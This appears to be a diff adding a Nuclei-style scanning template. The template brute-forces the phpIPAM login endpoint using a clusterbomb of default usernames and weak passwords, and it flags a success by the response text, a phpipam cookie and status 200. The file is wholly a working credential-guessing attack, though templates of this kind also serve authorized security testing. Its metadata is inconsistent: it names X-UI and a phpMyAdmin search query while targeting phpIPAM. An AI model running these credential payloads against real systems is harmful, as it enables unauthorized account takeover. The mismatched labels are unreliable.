@@ -1,0 +1,61 @@
+id: phpipam-default-login-burst
+ 
+info:
+  name: X-UI - Default Login
+  author: dali
+  severity: high
+  description: |
+    phpIPAM是一个开源的web IP地址管理应用程序。它的目标是提供简单的IP地址管理应用程序。它是基于ajax的使用jQuery库，它使用php脚本和javascript和一些HTML5/CSS3特性，所以一些现代浏览器首选能够快速正确地显示javascript。phpipam存在弱口令，攻击者可进行暴力破解。
+  reference:
+    - https://github.com/phpipam/phpipam
+  classification:
+    cwe-id: CWE-798
+  metadata:
+    verified: "true"
+    fofa-query: app="phpMyAdmin"
+  tags: phpipam,default-login
+ 
+http:
+  - method: POST
+    path:
+      - "{{BaseURL}}/app/login/login_check.php"
+    headers:
+      content-type: application/x-www-form-urlencoded; charset=UTF-8
+      X-Requested-With: XMLHttpRequest
+    body: "ipamusername={{username}}&ipampassword={{password}}"
+ 
+    attack: clusterbomb
+    payloads:
+      username:
+        - "Admin"
+        - "admin"
+        - "test"
+      password:
+        - "ipamadmin"
+        - "ipamadmin1"
+        - "admin"
+        - "Admin"
+        - "123456"
+        - "test"
+        - "p@ssw0rd"
+        - "P@ssw0rd"
+ 
+    matchers-condition: and
+    matchers:
+      - type: word
+        part: body
+        words:
+          - 'Login successful'
+          - '登陆成功'
+        condition: or
+ 
+      - type: word
+        part: header
+        words:
+          - 'phpipam='
+ 
+      - type: status
+        status:
+          - 200
+ 
+# Enhanced by md on 2023/02/08
